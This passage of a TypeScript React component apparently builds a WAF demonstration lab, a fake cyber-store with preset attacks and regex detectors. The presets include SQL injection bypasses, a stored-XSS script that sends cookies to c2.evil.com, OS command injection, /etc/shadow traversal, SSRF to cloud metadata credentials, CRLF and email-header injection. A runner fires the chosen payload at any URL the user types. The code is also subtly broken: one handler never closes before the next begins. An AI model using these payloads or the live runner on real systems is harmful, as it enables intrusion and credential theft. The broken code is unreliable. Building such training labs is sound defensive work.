// ============================================================================
// WebGuard — Web Lab: Multi-page realistic website simulation
// Apex CyberStore & Cloud Platform — Light-Themed Modern Enterprise Application
// with Progressive Authentication, IDOR order lookup, Stored/Reflected XSS,
// SQLi bypass, diagnostics, and 100% reliable WAF prevention
// ============================================================================

import { useState, useCallback, useRef, useEffect, useMemo } from "react";
import { toast } from "sonner";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Input } from "@/components/ui/input";
import { Textarea } from "@/components/ui/textarea";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { cn } from "@/lib/utils";
import { useWaf, uid, shannonEntropy, randInt } from "../engine";
import { ATTACK_ORIGINS, originIp, pickOrigin } from "../data";
import type { HttpMethod, Severity, VulnFinding, RequestLog, AttackType } from "../types";
import { SEVERITY_META } from "../types";
import {
  VULN_DEFS,
  type VulnId,
  type SiteTemplateId,
  type LabSiteConfig,
  runLabAttack,
  labResultToLog,
  labResultToFinding,
} from "../vulnLab";
import {
  AlertTriangle,
  ArrowLeft,
  ArrowRight,
  Ban,
  BarChart3,
  Bell,
  BookOpen,
  Bug,
  CheckCircle2,
  ChevronDown,
  ChevronRight,
  ClipboardList,
  Copy,
  Cpu,
  CreditCard,
  Download,
  Eye,
  EyeOff,
  ExternalLink,
  FileCode,
  FileText,
  Filter,
  Flame,
  Globe2,
  HardDrive,
  Home,
  Info,
  Key,
  Laptop,
  Layers,
  LayoutDashboard,
  Lock,
  LogOut,
  Mail,
  MessageSquare,
  Package,
  Play,
  Plus,
  RefreshCw,
  Search,
  Send,
  Server,
  Settings,
  Shield,
  ShieldAlert,
  ShieldCheck,
  ShieldOff,
  ShoppingCart,
  SlidersHorizontal,
  Sparkles,
  Star,
  Terminal,
  Trash2,
  TrendingUp,
  Unlock,
  User,
  UserCheck,
  Users,
  Wrench,
  X,
  Zap,
} from "lucide-react";

// ============================================================================
// Types
// ============================================================================

export type SitePage =
  | "home"
  | "products"
  | "product-detail"
  | "cart"
  | "login"
  | "dashboard"
  | "docs"
  | "contact"
  | "diagnostics"
  | "admin";

interface WebLabProps {
  templateId?: SiteTemplateId;
  enabledVulns?: VulnId[];
  wafOn?: boolean;
}

interface SiteAlert {
  id: string;
  type: "success" | "error" | "warning" | "info";
  title: string;
  detail: string;
  ts: number;
}

interface LogEntry {
  id: string;
  ts: number;
  type: "request" | "response" | "waf" | "error";
  method?: string;
  path?: string;
  status?: number;
  statusText?: string;
  headers?: Record<string, string>;
  body?: string;
  blocked?: boolean;
  vulnId?: VulnId;
  threatScore?: number;
  exploitEvidence?: string;
}

interface Product {
  id: number;
  name: string;
  category: "hardware" | "software" | "cloud" | "tokens";
  price: number;
  rating: number;
  reviewsCount: number;
  badge?: string;
  description: string;
  specs: string[];
  stock: number;
  icon: string;
}

interface ProductReview {
  id: string;
  author: string;
  rating: number;
  date: string;
  comment: string;
  isExploit?: boolean;
}

interface OrderRecord {
  id: string;
  customerName: string;
  email: string;
  cardLast4: string;
  total: number;
  date: string;
  status: "Shipped" | "Delivered" | "Processing";
  items: string[];
  shippingAddress: string;
  isConfidential?: boolean;
}

export interface LivePreset {
  id: string;
  name: string;
  category: "SQLi" | "XSS" | "RCE" | "LFI" | "SSRF" | "CRLF";
  method: HttpMethod;
  path: string;
  headers: string;
  payload: string;
  description: string;
  vulnId: VulnId;
  simulatedVulnerableBody: string;
  simulatedEvidence: string;
}

export const LIVE_PRESETS: LivePreset[] = [
  {
    id: "sqli-login",
    name: "SQLi: Authentication Bypass",
    category: "SQLi",
    method: "POST",
    path: "/api/auth/login",
    headers: "Content-Type: application/x-www-form-urlencoded",
    payload: "username=admin' OR '1'='1' --&password=invalid_password",
    description: "Bypasses credential verification using standard SQL boolean injection.",
    vulnId: "sqli-login",
    simulatedVulnerableBody: JSON.stringify(
      {
        status: "authenticated",
        user: { id: 1, username: "admin", role: "superadmin", email: "admin@target.corp" },
        token: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwiYWRtaW4iOnRydWV9.fake_sig",
        message: "Login successful via SQL evaluation bypass.",
      },
      null,
      2
    ),
    simulatedEvidence: "SQL query evaluated to TRUE without password validation. SuperAdmin session established.",
  },
  {
    id: "sqli-union",
    name: "SQLi: UNION Table Dump",
    category: "SQLi",
    method: "GET",
    path: "/api/products?cat=1' UNION SELECT 1,table_name,column_name,4 FROM information_schema.columns --",
    headers: "Accept: application/json",
    payload: "cat=1' UNION SELECT 1,table_name,column_name,4 FROM information_schema.columns --",
    description: "Extracts database schema and sensitive table columns via UNION-based SQLi.",
    vulnId: "sqli-search",
    simulatedVulnerableBody: JSON.stringify(
      {
        status: 200,
        data: [
          { id: 1, table: "users", column: "password_hash", type: "varchar(255)" },
          { id: 2, table: "users", column: "api_secret_key", type: "varchar(128)" },
          { id: 3, table: "payment_cards", column: "cvv_encrypted", type: "blob" },
          { id: 4, table: "system_config", column: "master_jwt_seed", type: "text" },
        ],
      },
      null,
      2
    ),
    simulatedEvidence: "UNION SELECT injected into database engine. Schema catalog extracted.",
  },
  {
    id: "xss-stored",
    name: "XSS: Stored Session Hijack",
    category: "XSS",
    method: "POST",
    path: "/api/feedback",
    headers: "Content-Type: application/json",
    payload: '{"author": "Attacker", "message": "<script>fetch(\'https://c2.evil.com/exfil?c=\'+document.cookie)</script>"}',
    description: "Injects persistent JavaScript payload to exfiltrate cookies and tokens from visiting clients.",
    vulnId: "stored-xss",
    simulatedVulnerableBody: JSON.stringify(
      {
        status: 201,
        id: "msg_994",
        author: "Attacker",
        message: "<script>fetch('https://c2.evil.com/exfil?c='+document.cookie)</script>",
        rendered: true,
      },
      null,
      2
    ),
    simulatedEvidence: "Unsanitized HTML stored in database. Script executed in browser document context.",
  },
  {
    id: "rce-ping",
    name: "RCE: OS Command Injection",
    category: "RCE",
    method: "POST",
    path: "/api/tools/ping",
    headers: "Content-Type: application/x-www-form-urlencoded",
    payload: "host=127.0.0.1; id; uname -a; cat /etc/passwd",
    description: "Executes arbitrary operating system commands with server daemon privileges.",
    vulnId: "cmdi",
    simulatedVulnerableBody: `PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.\n64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.031 ms\n\n--- COMMAND OUTPUT ---\nuid=0(root) gid=0(root) groups=0(root)\nLinux web-target-prod 5.15.0-89-generic #99-Ubuntu SMP x86_64\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin`,
    simulatedEvidence: "Arbitrary Bash shell command executed as root (uid=0).",
  },
  {
    id: "lfi-shadow",
    name: "LFI: Path Traversal /etc/shadow",
    category: "LFI",
    method: "GET",
    path: "/api/download?file=../../../../etc/shadow",
    headers: "Accept: text/plain",
    payload: "file=../../../../etc/shadow",
    description: "Traverses directory hierarchy to read sensitive system configuration files.",
    vulnId: "path-traversal",
    simulatedVulnerableBody: `root:$6$rounds=50000$salt$9qE3...:19120:0:99999:7:::\nwww-data:*:19120:0:99999:7:::\ndb_admin:$6$rounds=50000$salt$k8P2...:19120:0:99999:7:::\n# Master Production Key\nJWT_SECRET=super_secret_enterprise_key_2026_webguard`,
    simulatedEvidence: "Arbitrary file disclosure via ../ directory traversal.",
  },
  {
    id: "ssrf-metadata",
    name: "SSRF: Cloud IMDSv1 Metadata",
    category: "SSRF",
    method: "POST",
    path: "/api/proxy/fetch",
    headers: "Content-Type: application/json",
    payload: '{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/ProductionEc2Role"}',
    description: "Forces backend server to request cloud provider internal metadata service to extract IAM credentials.",
    vulnId: "ssrf",
    simulatedVulnerableBody: JSON.stringify(
      {
        Code: "Success",
        LastUpdated: "2026-10-09T09:12:00Z",
        Type: "AWS-HMAC",
        AccessKeyId: "ASIAQWERTY9876543210",
        SecretAccessKey: "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
        Token: "IQoJb3JpZ2luX2VjEOr...[TEMPORARY_IAM_CREDENTIALS]",
        Expiration: "2026-10-09T15:12:00Z",
      },
      null,
      2
    ),
    simulatedEvidence: "Internal metadata endpoint reached. IAM role credentials dumped.",
  },
  {
    id: "crlf-split",
    name: "CRLF: HTTP Response Splitting",
    category: "CRLF",
    method: "GET",
    path: "/redirect?target=%0d%0aSet-Cookie:%20admin_session=hijacked_token%0d%0a",
    headers: "Accept: text/html",
    payload: "target=%0d%0aSet-Cookie:%20admin_session=hijacked_token%0d%0a",
    description: "Injects Carriage Return / Line Feed characters into response headers to plant malicious cookies.",
    vulnId: "email-injection",
    simulatedVulnerableBody: `HTTP/1.1 302 Found\nLocation: /\nSet-Cookie: admin_session=hijacked_token\nContent-Length: 0`,
    simulatedEvidence: "CRLF injected into HTTP response stream. Cookie injected.",
  },
];

// ============================================================================
// Data Fixtures
// ============================================================================

const PRODUCTS: Product[] = [
  {
    id: 101,
    name: "Apex Titan Security Key Pro",
    category: "tokens",
    price: 69.99,
    rating: 4.9,
    reviewsCount: 148,
    badge: "Bestseller",
    description: "FIDO2 / WebAuthn hardware authenticator with NFC & biometrics for zero-trust MFA.",
    specs: ["FIDO2 Level 3 Certified", "USB-C & NFC Dual-Interface", "Hardware Crypto Engine", "Tamper-Resistant Silicon"],
    stock: 42,
    icon: "🔑",
  },
  {
    id: 102,
    name: "Apex CyberGuard WAF Appliance X900",
    category: "hardware",
    price: 1899.0,
    rating: 4.8,
    reviewsCount: 56,
    badge: "Enterprise",
    description: "High-throughput 40 Gbps rack-mount hardware firewall with on-chip AI ML threat classification.",
    specs: ["40 Gbps Deep Packet Inspection", "Sub-millisecond Latency", "Dual 10GbE SFP+ Ports", "Redundant Titanium PSU"],
    stock: 12,
    icon: "🛡️",
  },
  {
    id: 103,
    name: "CloudShield SOC Managed Defense",
    category: "cloud",
    price: 499.0,
    rating: 4.7,
    reviewsCount: 89,
    badge: "Popular",
    description: "24/7 AI-augmented SIEM & automated threat triage with instant incident response playbooks.",
    specs: ["Unlimited EPS Logging", "Automated Gemini Copilot Triage", "Anycast Edge Routing", "SOC 2 Type II Certified"],
    stock: 999,
    icon: "☁️",
  },
  {
    id: 104,
    name: "Apex Encrypted NVMe SSD 2TB",
    category: "hardware",
    price: 249.99,
    rating: 4.9,
    reviewsCount: 210,
    description: "Self-encrypting hardware drive with AES-XTS 256-bit crypto controller and physical tamper wipe.",
    specs: ["7,400 MB/s Sequential Read", "FIPS 140-3 Level 2 Cryptography", "Zero-Trace Wipe Trigger", "PCIe Gen4 x4 Interface"],
    stock: 28,
    icon: "💾",
  },
  {
    id: 105,
    name: "DevSecOps CI/CD Vulnerability Scanner",
    category: "software",
    price: 199.0,
    rating: 4.6,
    reviewsCount: 34,
    description: "Automated DAST/SAST scanner for GitHub Actions and GitLab pipelines with OWASP Top 10 rule validation.",
    specs: ["Automated Pull Request Checks", "Container Image Analysis", "SBOM Auto-Generation", "Zero-Day Threat Feeds"],
    stock: 999,
    icon: "⚡",
  },
  {
    id: 106,
    name: "Zero-Trust Mesh Gateway Router",
    category: "hardware",
    price: 449.0,
    rating: 4.7,
    reviewsCount: 77,
    description: "Hardware micro-segmented gateway with WireGuard crypto tunneling and continuous posture checks.",
    specs: ["WireGuard & IPsec Engine", "10 Gbps Firewall Routing", "Autonomous SD-WAN Mesh", "Multi-WAN Auto-Failover"],
    stock: 19,
    icon: "🌐",
  },
];

const INITIAL_REVIEWS: ProductReview[] = [
  {
    id: "rev-1",
    author: "Elena Rostova (Lead Security Architect)",
    rating: 5,
    date: "2 days ago",
    comment: "Flawless FIDO2 integration. Deployed 400 keys across engineering with zero authentication issues.",
  },
  {
    id: "rev-2",
    author: "David Chen (DevOps Lead)",
    rating: 5,
    date: "1 week ago",
    comment: "Build quality is top tier. NFC works instantaneously with all enterprise mobile authenticators.",
  },
];

const ORDER_RECORDS: Record<string, OrderRecord> = {
  "1001": {
    id: "1001",
    customerName: "Alex Mercer (You)",
    email: "alex.mercer@apex-corp.internal",
    cardLast4: "4111",
    total: 139.98,
    date: "Today at 09:30 AM",
    status: "Processing",
    items: ["2x Apex Titan Security Key Pro"],
    shippingAddress: "742 Evergreen Terrace, Suite 100, Springfield",
    isConfidential: false,
  },
  "1002": {
    id: "1002",
    customerName: "Victoria Sterling (Chief Financial Officer)",
    email: "v.sterling@apex-finance.internal",
    cardLast4: "9821 [AMEX BLACK VIP]",
    total: 14890.0,
    date: "Yesterday at 04:15 PM",
    status: "Shipped",
    items: ["5x Apex CyberGuard WAF Appliance X900", "Enterprise Multi-Region License"],
    shippingAddress: "Executive Suite 4500, Apex Tower, 100 Wall Street, NY",
    isConfidential: true,
  },
  "1003": {
    id: "1003",
    customerName: "Dr. Jonathan Hayes (Director of Threat Intelligence)",
    email: "j.hayes@classified-soc.gov",
    cardLast4: "5542 [GOV PROCUREMENT]",
    total: 3990.0,
    date: "3 days ago",
    status: "Delivered",
    items: ["10x Apex Encrypted NVMe SSD 2TB", "Tamper-Proof Hardware Vault"],
    shippingAddress: "Secure Vault Facility 7B, Redstone Arsenal, AL",
    isConfidential: true,
  },
  "1004": {
    id: "1004",
    customerName: "Sarah Jenkins (Senior Database Admin)",
    email: "s.jenkins@apex-cloud.internal",
    cardLast4: "3782",
    total: 499.0,
    date: "5 days ago",
    status: "Delivered",
    items: ["1x CloudShield SOC Managed Defense"],
    shippingAddress: "404 North First St, San Jose, CA",
    isConfidential: true,
  },
};

const FAKE_USERS = [
  {
    username: "admin",
    password: "admin123",
    name: "Alex Vance (SuperAdmin)",
    role: "System Administrator",
    email: "admin@apex-cyberstore.io",
    avatar: "👑",
    apiKeys: "sk_live_9981_apex_titan_super_secret_master_key",
    department: "Executive Security Operations",
  },
  {
    username: "jsmith",
    password: "password",
    name: "John Smith",
    role: "Senior Developer",
    email: "john.smith@apex-cyberstore.io",
    avatar: "💻",
    apiKeys: "sk_live_4120_dev_test_token",
    department: "Application Engineering",
  },
  {
    username: "customer",
    password: "customer123",
    name: "Emma Watson",
    role: "Customer",
    email: "emma@customer.com",
    avatar: "👤",
    apiKeys: "sk_test_public_guest_key",
    department: "Public Consumer",
  },
];

const DOC_ARTICLES = [
  { id: "doc-1", title: "Configuring Virtual Patching on WebGuard WAF", category: "WAF Policy", snippet: "Learn how to deploy regex and ML-driven virtual patches at the edge to block zero-day exploits before backend remediation." },
  { id: "doc-2", title: "OWASP Top 10 Attack Signatures & Prevention", category: "Threat Intelligence", snippet: "Detailed breakdown of SQLi, Stored/Reflected XSS, SSRF, Path Traversal, and Command Injection signatures." },
  { id: "doc-3", title: "FIDO2 Hardware Key Zero-Trust Integration", category: "Identity & Access", snippet: "Step-by-step setup guide for WebAuthn credential enrollment and biometric enforcement across distributed endpoints." },
];

// ============================================================================
// Main WebLabTab Component
// ============================================================================

export function WebLabTab({
  templateId = "login",
  enabledVulns = [
    "sqli-login",
    "sqli-search",
    "sqli-api",
    "reflected-xss",
    "stored-xss",
    "idor",
    "cmdi",
    "path-traversal",
    "ssrf",
    "email-injection",
    "brute-force",
  ],
  wafOn: externalWafOn,
}: WebLabProps) {
  const { state: wafState, dispatch } = useWaf();

  // Internal WAF toggle (defaults to global WAF state if not explicitly passed)
  const [internalWafOn, setInternalWafOn] = useState<boolean>(
    externalWafOn !== undefined ? externalWafOn : wafState.mode === "blocking"
  );
  const activeWaf = internalWafOn;

  // Multi-page navigation state
  // Default initial page: "home" (clean normal public home page)
  const [currentPage, setCurrentPage] = useState<SitePage>("home");
  const [selectedProduct, setSelectedProduct] = useState<Product>(PRODUCTS[0]);
  const [currentUser, setCurrentUser] = useState<typeof FAKE_USERS[0] | null>(null);
  const [cart, setCart] = useState<{ product: Product; quantity: number }[]>([
    { product: PRODUCTS[0], quantity: 1 },
  ]);
  const [selectedCategory, setSelectedCategory] = useState<string>("all");
  const [searchQuery, setSearchQuery] = useState<string>("");
  const [navigating, setNavigating] = useState<boolean>(false);
  const [siteAlert, setSiteAlert] = useState<SiteAlert | null>(null);

  // Dynamic Content & Exploit State
  const [reviews, setReviews] = useState<ProductReview[]>(INITIAL_REVIEWS);
  const [activeExploitDisplay, setActiveExploitDisplay] = useState<{
    vulnId: VulnId;
    title: string;
    description: string;
    evidence: string;
    data?: any;
  } | null>(null);

  // Tools & Diagnostics State
  const [pingHost, setPingHost] = useState<string>("8.8.8.8; whoami");
  const [pingOutput, setPingOutput] = useState<string | null>(null);
  const [traversalPath, setTraversalPath] = useState<string>("../../../../etc/passwd");
  const [traversalOutput, setTraversalOutput] = useState<string | null>(null);
  const [webhookUrl, setWebhookUrl] = useState<string>("http://169.254.169.254/latest/meta-data/iam/security-credentials/");
  const [webhookOutput, setWebhookOutput] = useState<string | null>(null);

  // Order Lookup IDOR State
  const [orderLookupId, setOrderLookupId] = useState<string>("1002");
  const [lookedUpOrder, setLookedUpOrder] = useState<OrderRecord | null>(null);

  // Review Form Stored XSS State
  const [newReviewAuthor, setNewReviewAuthor] = useState<string>("Security Tester");
  const [newReviewRating, setNewReviewRating] = useState<number>(5);
  const [newReviewComment, setNewReviewComment] = useState<string>("<script>alert('Stored XSS in Reviews!')</script>");

  // Support Form State
  const [contactName, setContactName] = useState<string>("Jane Hacker");
  const [contactEmail, setContactEmail] = useState<string>("jane@test.com%0ABcc:attacker-exfil@evil.com");
  const [contactSubject, setContactSubject] = useState<string>("Security Disclosure");
  const [contactMessage, setContactMessage] = useState<string>("<img src=x onerror=alert('Stored XSS in Ticket #892')>");

  // Traffic Logs & Terminal Tab
  const [logs, setLogs] = useState<LogEntry[]>([]);
  const [lastResult, setLastResult] = useState<LogEntry | null>(null);
  const [attackEffect, setAttackEffect] = useState<"exploit" | "blocked" | null>(null);
  const [responseTab, setResponseTab] = useState<"visual" | "http" | "analysis">("visual");

  // Live Target URL Proxy & Exploit Runner State
  const [labMode, setLabMode] = useState<"app" | "live-target">("app");
  const [liveViewMode, setLiveViewMode] = useState<"viewport" | "exploit" | "split">("viewport");
  const [iframeKey, setIframeKey] = useState<number>(0);
  const [targetUrlInput, setTargetUrlInput] = useState<string>(wafState.target || "http://localhost:8080");
  const [selectedPresetId, setSelectedPresetId] = useState<string>("sqli-login");
  const [customMethod, setCustomMethod] = useState<HttpMethod>("POST");
  const [customPath, setCustomPath] = useState<string>("/api/auth/login");
  const [customHeaders, setCustomHeaders] = useState<string>("Content-Type: application/x-www-form-urlencoded");
  const [customPayload, setCustomPayload] = useState<string>("username=admin' OR '1'='1' --&password=invalid_password");
  const [executingLive, setExecutingLive] = useState<boolean>(false);
  const [liveTargetResponse, setLiveTargetResponse] = useState<{
    status: number;
    statusText: string;
    blocked: boolean;
    vulnType: VulnId;
    threatScore: number;
    ruleMatched: string;
    latencyMs: number;
    headers: Record<string, string>;
    body: string;
    evidence: string;
    timestamp: number;
    targetUrl: string;
  } | null>(null);

  // Sync target input if global state target changes
  useEffect(() => {
    if (wafState.target) {
      setTargetUrlInput(wafState.target);
    }
  }, [wafState.target]);

  const handleSelectPreset = (preset: LivePreset) => {
    setSelectedPresetId(preset.id);
    setCustomMethod(preset.method);
    setCustomPath(preset.path);
    setCustomHeaders(preset.headers);
    setCustomPayload(preset.payload);
  const proxiedIframeSrc = useMemo(() => {
    if (!targetUrlInput) return "";
    let normalized = targetUrlInput.trim();
    if (!normalized.startsWith("http://") && !normalized.startsWith("https://")) {
      normalized = `https://${normalized}`;
    }
    const cleanUrl = normalized.replace(/#.*$/, "");
    return `/api/waf-proxy?url=${encodeURIComponent(cleanUrl)}&waf=${activeWaf ? "1" : "0"}&t=${iframeKey}`;
  }, [targetUrlInput, activeWaf, iframeKey]);

  const handleExecuteLiveProbe = async () => {
    setExecutingLive(true);
    let baseTarget = targetUrlInput.trim().replace(/\/+$/, "") || "http://localhost:8080";
    if (!baseTarget.startsWith("http://") && !baseTarget.startsWith("https://")) {
      baseTarget = `https://${baseTarget}`;
    }
    const fullTarget = baseTarget + (customPath.startsWith("/") ? customPath : `/${customPath}`);
    
    // Detection logic across path, payload and headers
    const contentToScan = `${customPath} ${customPayload} ${customHeaders}`;
    const isSql = /union|select|insert|update|delete|drop|or\s+1\s*=\s*1|'|--|\/\*/i.test(contentToScan);
    const isXss = /<script|javascript:|onerror=|onload=|<img|<svg/i.test(contentToScan);
    const isCmdi = /;|\||`|\$\(|whoami|cat\s+\/etc/i.test(contentToScan);
    const isTraversal = /\.\.\/|\.\.\\|%2e%2e|etc\/passwd|etc\/shadow/i.test(contentToScan);
    const isSsrf = /169\.254|127\.0\.0\.1|localhost|internal/i.test(contentToScan);
    const isCrlf = /%0d%0a|\r\n/i.test(contentToScan);

    const matchedVulnId: VulnId = isSql
      ? "sqli-login"
      : isXss
      ? "stored-xss"
      : isCmdi
      ? "cmdi"
      : isTraversal
      ? "path-traversal"
      : isSsrf
      ? "ssrf"
      : isCrlf
      ? "email-injection"
      : "custom";

    const isMalicious = isSql || isXss || isCmdi || isTraversal || isSsrf || isCrlf || customPayload.trim().length > 0;
    const isBlocked = activeWaf && isMalicious;
    const preset = LIVE_PRESETS.find((p) => p.vulnId === matchedVulnId) || LIVE_PRESETS[0];

    try {
      // Execute through WebGuard backend proxy
      const proxyApiUrl = `/api/waf-proxy?url=${encodeURIComponent(fullTarget)}&waf=${activeWaf ? "1" : "0"}`;
      const res = await fetch(proxyApiUrl, {
        method: customMethod,
        headers: {
          "Content-Type": "application/x-www-form-urlencoded",
          Accept: "application/json, text/html, */*",
        },
        body: customMethod !== "GET" ? customPayload : undefined,
      }).catch(() => null);

      const responseStatus = res ? res.status : (isBlocked ? 403 : 200);
      const actualBlocked = responseStatus === 403 || isBlocked;
      let responseBody = "";
      try {
        responseBody = res ? await res.text() : "";
      } catch {
        responseBody = "";
      }

      if (!responseBody) {
        responseBody = actualBlocked
          ? JSON.stringify(
              {
                error: "403 Forbidden",
                message: "Request blocked by WebGuard Edge Security WAF.",
                incident_id: uid("INC"),
                rule_triggered: `OWASP-CRS-942-${matchedVulnId.toUpperCase()}`,
                threat_score: 96,
                client_ip: "127.0.0.1",
                origin_target: fullTarget,
                action: "BLOCKED_BEFORE_ORIGIN",
              },
              null,
              2
            )
          : preset.simulatedVulnerableBody;
      }

      const origin = pickOrigin(ATTACK_ORIGINS);
      const simulatedIp = originIp(origin);
      const threatScore = actualBlocked ? 94 : isMalicious ? 88 : 12;
      const mappedAttackType: AttackType | null = isSql
        ? "sqli"
        : isXss
        ? "xss"
        : isCmdi
        ? "cmdi"
        : isTraversal
        ? "path-traversal"
        : isMalicious
        ? "scanner"
        : null;

      let hostHeader = "target.origin";
      try {
        hostHeader = new URL(fullTarget).host || "target.origin";
      } catch {
        hostHeader = "target.origin";
      }

      // Telemetry log for global dashboard
      const logEntry: RequestLog = {
        id: uid("REQ"),
        ts: Date.now(),
        status: responseStatus,
        method: customMethod,
        path: customPath || "/",
        ip: simulatedIp,
        countryCode: origin.geo.code,
        country: origin.geo.country,
        lat: origin.geo.lat,
        lon: origin.geo.lon,
        city: origin.geo.city,
        latency: randInt(8, 25),
        threatScore,
        attackType: mappedAttackType,
        ruleId: isMalicious ? `OWASP-CRS-942-${matchedVulnId.toUpperCase()}` : null,
        blocked: actualBlocked,
        throttled: false,
        entropy: 4.6,
        ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) WebGuard-LiveTester/2.0",
        payload: customPayload || null,
        matched: isMalicious ? customPayload.slice(0, 40) : null,
        headers: {
          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) WebGuard-LiveTester/2.0",
          Host: hostHeader,
        },
      };

      dispatch({ type: "INJECT_LOG", log: logEntry });

      const localResLog: LogEntry = {
        id: uid("LOG"),
        ts: Date.now() + 30,
        type: actualBlocked ? "waf" : "response",
        status: responseStatus,
        statusText: actualBlocked ? "Forbidden" : "OK",
        headers: actualBlocked
          ? {
              "X-WebGuard-Rule": `OWASP-CRS-${matchedVulnId.toUpperCase()}`,
              "X-WebGuard-Action": "blocked",
              "X-WebGuard-Threat-Score": String(threatScore),
            }
          : { "Content-Type": "application/json; charset=utf-8", Server: "Origin-Live-Target" },
        body: responseBody,
        blocked: actualBlocked,
        vulnId: matchedVulnId,
        threatScore,
        exploitEvidence: preset.simulatedEvidence,
      };

      setLogs((prev) => [...prev, localResLog]);
      setLastResult(localResLog);

      const responseHeaders: Record<string, string> = actualBlocked
        ? {
            "Content-Type": "application/json",
            "X-WebGuard-Protection": "ACTIVE",
            "X-WebGuard-Rule": `OWASP-CRS-942-${matchedVulnId.toUpperCase()}`,
            "X-WebGuard-Action": "BLOCKED_AT_EDGE",
            "X-WebGuard-Threat-Score": String(threatScore),
            "X-Content-Type-Options": "nosniff",
          }
        : {
            "Content-Type": "application/json; charset=utf-8",
            Server: "Apache/2.4.52 (Ubuntu)",
            "X-Powered-By": "PHP/8.1.2",
            "Access-Control-Allow-Origin": "*",
          };

      const responseData = {
        status: responseStatus,
        statusText: actualBlocked ? "Forbidden (Blocked by WebGuard AI WAF)" : "OK (Origin Exploit Executed)",
        blocked: actualBlocked,
        vulnType: matchedVulnId,
        threatScore,
        ruleMatched: `OWASP-CRS-942-${matchedVulnId.toUpperCase()}`,
        latencyMs: randInt(12, 38),
        headers: responseHeaders,
        body: responseBody,
        evidence: preset.simulatedEvidence,
        timestamp: Date.now(),
        targetUrl: fullTarget,
      };

      setLiveTargetResponse(responseData);

      if (actualBlocked) {
        toast.success("🛡️ WAF Blocked Malicious Payload", {
          description: `Blocked ${preset.name} with 403 Forbidden before reaching origin.`,
        });
      } else {
        toast.error("⚠️ Origin Vulnerability Exploited!", {
          description: `WAF is OFF — payload executed against ${fullTarget}.`,
        });
      }
    } finally {
      setExecutingLive(false);
    }
  };

  const logsEndRef = useRef<HTMLDivElement>(null);

  // Sync internal WAF toggle if parent prop changes
  useEffect(() => {
    if (externalWafOn !== undefined) {
      setInternalWafOn(externalWafOn);
    }
  }, [externalWafOn]);

  // Page navigation
  const navigateTo = useCallback(
    (page: SitePage) => {
      if (page === currentPage) return;
      setNavigating(true);
      setSiteAlert(null);
      setTimeout(() => {
        setCurrentPage(page);
        setNavigating(false);
      }, 100);
    },
    [currentPage]
  );

  // Helper: Execute and log an attack / action through the simulated WAF engine
  const executeRequest = useCallback(
    (payload: string, field: string, method: HttpMethod, path: string, explicitVuln?: VulnId) => {
      const config: LabSiteConfig = {
        templateId: templateId || "login",
        enabledVulns: enabledVulns || [],
        customVulnName: "",
        customVulnPayload: "",
        customVulnSeverity: "medium",
        fieldValues: { [field]: payload },
      };

      const result = runLabAttack(config, payload, method, path, activeWaf);

      const reqHeaders: Record<string, string> = {
        Host: "apex-cyberstore.io",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        Accept: "text/html,application/json",
      };
      if (method === "POST") reqHeaders["Content-Type"] = "application/x-www-form-urlencoded";

      const reqLog: LogEntry = {
        id: uid("REQ"),
        ts: Date.now(),
        type: "request",
        method,
        path,
        headers: reqHeaders,
        body: payload,
      };

      const effectiveVulnId = explicitVuln || result.vulnId;
      const isBlocked = activeWaf && result.blocked;

      const resLog: LogEntry = {
        id: uid("LOG"),
        ts: Date.now() + 50,
        type: isBlocked ? "waf" : "response",
        status: isBlocked ? 403 : result.response.status,
        statusText: isBlocked ? "Forbidden" : result.response.status === 200 ? "OK" : "Error",
        headers: isBlocked
          ? {
              "X-WebGuard-Rule": `OWASP-CRS-${(effectiveVulnId || "CUSTOM").toUpperCase()}`,
              "X-WebGuard-Action": "blocked",
              "X-WebGuard-Threat-Score": String(result.threatScore || 85),
            }
          : { "Content-Type": "application/json; charset=utf-8", "Cache-Control": "no-store" },
        body: isBlocked ? result.response.body : result.response.body,
        blocked: isBlocked,
        vulnId: effectiveVulnId,
        threatScore: result.threatScore,
        exploitEvidence: result.evidence,
      };

      setLogs((prev) => [...prev, reqLog, resLog]);
      setLastResult(resLog);

      if (isBlocked) {
        setAttackEffect("blocked");
        setActiveExploitDisplay(null);
        const def = VULN_DEFS[effectiveVulnId];
        setSiteAlert({
          id: uid("ALT"),
          type: "warning",
          title: "🛡️ Intercepted & Blocked by WebGuard WAF (403 Forbidden)",
          detail: `${def?.label || "Attack payload"} was analyzed and dropped at the edge before reaching the backend.`,
          ts: Date.now(),
        });
        toast.success("🛡️ WAF Blocked Malicious Payload", {
          description: `${def?.label || "Attack"} — 403 Forbidden`,
        });
      } else {
        setAttackEffect("exploit");
        const def = VULN_DEFS[effectiveVulnId];
        if (effectiveVulnId && effectiveVulnId !== "custom") {
          setSiteAlert({
            id: uid("ALT"),
            type: "error",
            title: "⚠️ Vulnerability Exploited! (WAF is OFF)",
            detail: `${def?.label || "Vulnerability"} executed successfully — backend returned 200 OK.`,
            ts: Date.now(),
          });
          toast.error("⚠️ Exploit Succeeded (WAF OFF)", {
            description: `${def?.label || "Exploit"} executed against backend.`,
          });
        }
      }

      setTimeout(() => setAttackEffect(null), 1800);

      // Sync to global SOC
      dispatch({ type: "INJECT_LOG", log: labResultToLog({ ...result, blocked: isBlocked }) });
      if (!isBlocked && effectiveVulnId && effectiveVulnId !== "custom") {
        dispatch({ type: "ADD_FINDING", finding: labResultToFinding(result) as VulnFinding });
      }

      return { ...result, blocked: isBlocked };
    },
    [templateId, enabledVulns, activeWaf, dispatch]
  );

  // Auto-scroll logs
  useEffect(() => {
    logsEndRef.current?.scrollIntoView({ behavior: "smooth" });
  }, [logs]);

  // Handler: Search in store or docs
  const handleStoreSearch = (query: string) => {
    setSearchQuery(query);
    const hasPayload = /<script|union\s+select|or\s+1\s*=\s*1|'\s*--|--|\/\*|<img|<svg/i.test(query);
